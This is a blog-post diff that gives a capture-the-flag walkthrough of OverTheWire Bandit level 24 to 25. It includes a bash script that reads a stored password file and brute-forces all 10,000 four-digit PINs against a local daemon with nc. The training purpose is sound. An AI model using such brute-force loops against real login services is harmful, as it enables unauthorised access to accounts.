@@ -1,0 +1,48 @@
+---
+layout: post
+title:  "Bandit Level 24 → Level 25"
+date:   2021-05-22 21:24:46
+categories: ctf wargames linux
+tags: wargames ctf overthewire linux
+series: "OverTheWire: Bandit"
+excerpt: watch this
+mathjax: false
+---
+
+## Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+
+## Solution
+```bash
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+^C
+bandit24@bandit:~$ cd `mktemp -d`
+bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ vim getpass.sh
+bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ chmod 777 getpass.sh
+bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ chmod 777 /tmp/tmp.XeNXy1uRbi
+bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ ./getpass.sh > answerfile
+bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ nc localhost 30002 < answerfile
+...
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is u------------------------------G
+Exiting.
+
+```
+
+Contents of getpass.sh
+```bash
+#!/bin/bash                           
+passwd=$(cat /etc/bandit_pass/bandit24)
+
+for i in {0..9999}; do
+  printf "%s %04d\n" "$passwd" "$i"
+done
+```
+
+## Explanation
+This level further explores Bash scripting. This time you need to know how to use a for loop and printf.
